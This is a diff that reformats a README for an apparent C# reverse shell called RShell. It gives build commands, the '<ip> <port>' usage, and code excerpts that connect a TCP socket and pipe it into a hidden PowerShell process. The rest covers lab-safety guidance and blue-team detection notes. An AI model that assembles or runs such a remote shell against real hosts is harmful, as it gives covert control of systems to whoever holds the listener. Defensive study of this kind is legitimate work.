@@ -35,149 +35,135 @@ If you prefer SDK-style:
 dotnet new console -n RShell
 # Copy your Program.cs over the generated one
 dotnet build -c Release RShell
-Option C — CSC (C# compiler)
+```
+
+### Option C — CSC (C# compiler)
 If the .NET compiler is available on PATH:
 
-bash
-Copy code
+```bash
 csc src\\Program.cs -out:RShell.exe
+```
+
 If you change the PowerShell path or add cross-platform support, document those changes in this README.
 
-▶️ Runtime Parameters
+## ▶️ Runtime Parameters
 The program expects two arguments:
 
-bash
-Copy code
+```bash
 RShell.exe <ip> <port>
-<ip> : Destination IP (string)
+```
 
-<port> : Destination port (integer)
+- `<ip>` : Destination IP (string)
+- `<port>` : Destination port (integer)
 
 ⚠️ Note: This is for lab use only in environments you own/control and are authorized to test.
 Do not point this at networks or hosts without written consent.
 
-🔍 Code Walkthrough
+## 🔍 Code Walkthrough
 Key elements in Program.cs:
 
-Networking:
+### Networking:
 
-csharp
-Copy code
+```csharp
 TcpClient client = new TcpClient();
 client.Connect(ip, port);
-Streams:
+```
+
+### Streams:
 Wraps the network stream with StreamReader/StreamWriter for line-oriented I/O.
 
-Process:
+### Process:
 Launches PowerShell via ProcessStartInfo with:
 
-csharp
-Copy code
+```csharp
 p.StartInfo.UseShellExecute = false;
 p.StartInfo.RedirectStandardInput = true;
 p.StartInfo.RedirectStandardOutput = true;
 p.StartInfo.RedirectStandardError = true;
 p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
-Event Handlers:
+```
+
+### Event Handlers:
 Subscribes to OutputDataReceived / ErrorDataReceived to forward output lines back over the socket.
 
-Loop:
+### Loop:
 Reads remote lines and writes them to:
 
-csharp
-Copy code
+```csharp
 p.StandardInput.WriteLine(userInput);
-🧪 Safe Lab & Testing Guidance (High-Level)
+```
+
+## 🧪 Safe Lab & Testing Guidance (High-Level)
 To keep this ethical and safe:
 
-Isolate your lab. Use local VMs or containers on a closed network with no internet egress.
+- Isolate your lab. Use local VMs or containers on a closed network with no internet egress.
+- Document consent. If collaborating, get written permission (scope, dates, systems, data handling).
+- Least privilege. Use non-admin test accounts and non-production systems/data.
+- Observe & learn. Pair runs with monitoring (process creation logs, PowerShell logging, network telemetry).
+- No operationalization. This README does not include listener setup or exploitation steps.
 
-Document consent. If collaborating, get written permission (scope, dates, systems, data handling).
-
-Least privilege. Use non-admin test accounts and non-production systems/data.
-
-Observe & learn. Pair runs with monitoring (process creation logs, PowerShell logging, network telemetry).
-
-No operationalization. This README does not include listener setup or exploitation steps.
-
-🛡️ Blue-Team Notes (Defensive Study)
+## 🛡️ Blue-Team Notes (Defensive Study)
 When running in a lab, explore how the following controls observe activity:
 
-PowerShell Logging: Script Block, Module, and Transcription logging
-
-AMSI (Antimalware Scan Interface): Scans PowerShell content before execution
-
-Process Creation Events: Windows Event ID 4688 / Sysmon Event ID 1
-
-Network Telemetry: Egress connections, unusual destinations/ports
-
-Command-line Auditing: Visibility into -ExecutionPolicy Bypass usage
+- PowerShell Logging: Script Block, Module, and Transcription logging
+- AMSI (Antimalware Scan Interface): Scans PowerShell content before execution
+- Process Creation Events: Windows Event ID 4688 / Sysmon Event ID 1
+- Network Telemetry: Egress connections, unusual destinations/ports
+- Command-line Auditing: Visibility into -ExecutionPolicy Bypass usage
 
 Questions to ask in your lab:
 
-Which alerts fire?
+- Which alerts fire?
+- What telemetry is missing?
+- How could defenders detect similar behavior earlier?
 
-What telemetry is missing?
-
-How could defenders detect similar behavior earlier?
-
-⚙️ Configuration Ideas (for Learning)
+## ⚙️ Configuration Ideas (for Learning)
 If you extend the project (in your lab), consider adding:
 
-Configurable PowerShell path for different Windows versions
-
-Timeouts/Retries for connections
-
-Graceful Exit signals to close the child process cleanly
-
-Optional local logging (lab only) for troubleshooting
-
-Authentication/TLS (lab only) to explore secure communication
+- Configurable PowerShell path for different Windows versions
+- Timeouts/Retries for connections
+- Graceful Exit signals to close the child process cleanly
+- Optional local logging (lab only) for troubleshooting
+- Authentication/TLS (lab only) to explore secure communication
 
 ⚠️ Do not add evasion features or anti-forensic behavior. Such contributions will be rejected.
 
-🚫 Known Limitations
-Windows-only (hardcoded PowerShell path)
+## 🚫 Known Limitations
+- Windows-only (hardcoded PowerShell path)
+- No encryption/authentication on the TCP channel
+- Minimal error handling
+- No reconnection logic or persistence (by design)
+- Requires interactive remote input (no job control)
 
-No encryption/authentication on the TCP channel
-
-Minimal error handling
-
-No reconnection logic or persistence (by design)
-
-Requires interactive remote input (no job control)
-
-❓ FAQ
-Q: Why omit listener/exploitation instructions?
+## ❓ FAQ
+**Q: Why omit listener/exploitation instructions?**  
 A: To avoid misuse. This project is for understanding code paths and defensive visibility, not for exploitation.
 
-Q: Can I change -ExecutionPolicy Bypass?
+**Q: Can I change -ExecutionPolicy Bypass?**  
 A: Yes — this is just for lab use. Try stricter settings and study logs.
 
-Q: Will you accept PRs adding stealth/evasion?
+**Q: Will you accept PRs adding stealth/evasion?**  
 A: No. Only educational or defensive improvements are accepted.
 
-🤝 Contributing
+## 🤝 Contributing
 Keep changes educational and defense-oriented.
 
 Do not submit features meant to bypass security controls.
 
 Include documentation and rationales in PRs.
 
-🔐 Disclosure & Safety Policy
+## 🔐 Disclosure & Safety Policy
 If you discover a security issue in this repository:
 
-Do not post it publicly.
-
-Open a private report (via GitHub Security Advisory, if available).
-
-Or contact the maintainer by email.
+- Do not post it publicly.
+- Open a private report (via GitHub Security Advisory, if available).
+- Or contact the maintainer by email.
 
 For real-world vulnerabilities elsewhere, follow responsible disclosure with the affected vendor.
 
-📄 License (MIT)
-vbnet
-Copy code
+## 📄 License (MIT)
+
+```
 Copyright (c) 2025
 
 Permission is hereby granted, free of charge, to any person obtaining a copy
@@ -197,3 +183,4 @@ authors or copyright holders be liable for any claim, damages or other
 liability, whether in an action of contract, tort or otherwise, arising from,
 out of or in connection with the Software or the use or other dealings in the
 Software.
+```
